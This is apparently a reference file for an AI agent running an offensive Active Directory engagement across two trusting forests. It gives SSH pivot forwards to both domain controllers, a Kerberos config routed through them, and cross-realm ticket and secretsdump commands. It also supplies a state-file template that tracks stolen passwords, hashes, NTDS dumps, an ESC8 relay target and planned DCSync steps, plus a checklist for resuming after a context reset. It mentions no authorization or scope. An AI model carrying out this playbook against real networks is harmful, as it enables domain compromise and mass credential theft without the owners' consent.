# Pivot sets and state recovery across a context boundary

Companion to `cross-forest-trust-abuse/SKILL.md`. Two problems this solves:

1. You have a dual-homed host and need ticket traffic at both forests' KDC at
   the same time (impacket will not chase referrals; MIT krb5 needs to reach
   both KDCs from one clock-accurate host).
2. Your context window (or the session) dies mid-engagement and you must be
   productive in the next turn without re-deriving everything.

## 1. SSH forward sets through a dual-homed host

Chain: `you → jumphost(10.0.0.5, 10.10.10.5) → DC-A(10.10.10.10) / DC-B(10.20.20.10)`.

```bash
# one connection, four forwards: A's LDAP/kerberos, B's LDAP/kerberos
ssh -N -o ExitOnForwardFailure=yes \
    -L 13389:10.10.10.10:389  -L 10088:10.10.10.10:88 \
    -L 23389:10.20.20.10:389  -L 20088:10.20.20.10:88 \
    user@10.0.0.5 &

# SMB on both (445 is usually open even when 389 is filtered by policy)
ssh -N -L 14451:10.10.10.10:445 -L 24451:10.20.20.10:445 user@10.0.0.5 &
```

Kerbros points at forwards, not real IPs, and `dns_lookup_kdc` must be off or
krb5 will ignore your port mapping:

```ini
# /tmp/krb5.eng
[libdefaults]
  default_realm = A.LOCAL
  dns_lookup_kdc = false
  dns_lookup_realm = false
  rdns = false
  udp_preference_limit = 1          # force TCP: forwards are TCP only

[realms]
  A.LOCAL = { kdc = 127.0.0.1:10088  admin_server = 127.0.0.1:1749 }
  B.LOCAL = { kdc = 127.0.0.1:20088  admin_server = 127.0.0.1:2749 }

[domain_realm]
  .a.local = A.LOCAL
  .b.local = B.LOCAL
```

Use it:

```bash
export KRB5_CONFIG=/tmp/krb5.eng
kinit -V user@A.LOCAL              # clock must match A's KDC: meter it first
kvno cifs/dc01.b.local@B.LOCAL     # cross-realm referral chased by MIT
export KRB5CCNAME=FILE:/tmp/eng.ccache
impacket-secretsdump -k -no-pass -dc-ip 127.0.0.1 ...
```

Gotchas that cost hours:

- **`udp_preference_limit = 1`** — krb5 defaults to UDP first; an SSH forward
  is TCP-only, so the first packet vanishes and you get a 30 s timeout that
  looks like "KDC unreachable".
- **`dns_lookup_kdc`** — if DNS resolves the realm, krb5 silently uses the
  real KDC address (unroutable) instead of your forward.
- **Hostnames in SPNs** — `cifs/dc01.b.local` requires name resolution inside
  the target network. Either add `-o HostKeyAlias`-style `/etc/hosts` entries
  (`10.20.20.10 dc01.b.local`) or point the pivot's own resolver at B's DNS
  through a second forward (`-L 15353:10.20.20.10:53`) and run a local
  `dnsmasq`/`socat` for it.
- **Clock is shared** — every KDC you touch checks the same local clock. If A
  and B drift apart by more than 5 minutes, no single clock works; run each
  chain on the host nearest its KDC, or shift per-process
  (`kerberos-trust-abuse/references/krbskew_hook.py`).
- **CCache hygiene** — `MIT` writes `FILE:/tmp/...` ccaches readable by other
  users on a shared pivot. `chmod 600` and unlink at the end; also remember the
  ccache must hold a **TGT for its own realm** before a cross-realm `kvno`
  works ("Matching credential not found" means exactly that).

## 2. State file — survive the context boundary

One directory per target, one `STATE.md` inside it. Written for a cold start:
a fresh session should be able to continue from this file alone.

```text
eng/<target>/
├── STATE.md          # the only file you must read on resume
├── creds/            # ccache, keys, hashes (chmod 600, never git-tracked)
├── ports/            # per-host nmap output
├── loot/             # SAM/NTDS/registry dumps, gpp cpassword, certs
└── notes/            # per-rung notes, failed paths with the exact error
```

`STATE.md` template — keep it terse and factual:

```markdown
# <target> — state
updated: 2026-01-01T12:00Z
phase: cross-forest / step 2b
clock: A -2s, B +14s (measured with smb2time.py)

## Access
- A\svc_low : password  (works: LDAP, SMB)
- B\helpdesk: NT hash    (works: SMB on FS02 only)
- ccache: creds/a.ccache (TGT A.LOCAL, expires 10h)

## Trust
A.LOCAL <-> B.LOCAL  trustAttributes=0x8, direction=bidirectional
SID filtering: NOT enforced (verified: extra SID 32-551 resolved)

## Confirmed
- B DC01: SMB signing required, no LDAP signing, LDAP channel binding off
- ESC8 on B's CA (b-ca01.b.local) — relay target identified, not executed

## Dead ends (do not retry)
- Step 2 forged extra-SID -> rights unchanged even though attr&0x4==0
  (2025 PAC hardening rejects fictitious RID; need real RID)
- impacket-getST cross-realm: KDC_ERR_WRONG_REALM (impacket doesn't chase)

## Next
1. dacledit -rights DCSync on DC=B,DC=b,DC=local using B\helpdesk
2. secretsdump -just-dc; verify krbtgt AES from both forests differ
```

Rules that keep it useful:

- **Record the exact error string** for a dead end. "Didn't work" is worthless;
  `STATUS_ACCESS_DENIED 0xc0000022 on SAM with SeBackupPrivilege in token`
  tells the next session to check `FILE_OPEN_FOR_BACKUP_INTENT` instead of
  re-trying the same command for 20 minutes.
- **Timestamp every measurement** (clock skew, ticket lifetime) — a 6-hour-old
  skew number is a trap on a drifting DC.
- **Never store a credential only in the transcript.** Hash/password goes in
  `creds/` (or the vault) and `STATE.md` references the path.
- **Prune on success:** once a step is confirmed, delete its "next" entry and
  add the outcome under "Confirmed", so the file stays a state machine rather
  than a log.

## 3. Resume checklist (first 2 minutes of a cold session)

1. `cat eng/<target>/STATE.md` — read the clock line before anything Kerberos.
2. Re-verify access with one cheap call per credential (`nxc smb <host> -u x -p y`)
   — credentials expire, machines get patched, accounts get disabled.
3. Re-measure clock skew if the state file is older than an hour.
4. Re-check the pivot forwards are still up (`ss -lntp | grep -E '1338|1008|2338|2008'`)
   — an SSH forward dies silently with the parent shell.
5. Only then continue at "Next". Do not re-run recon to "make sure".
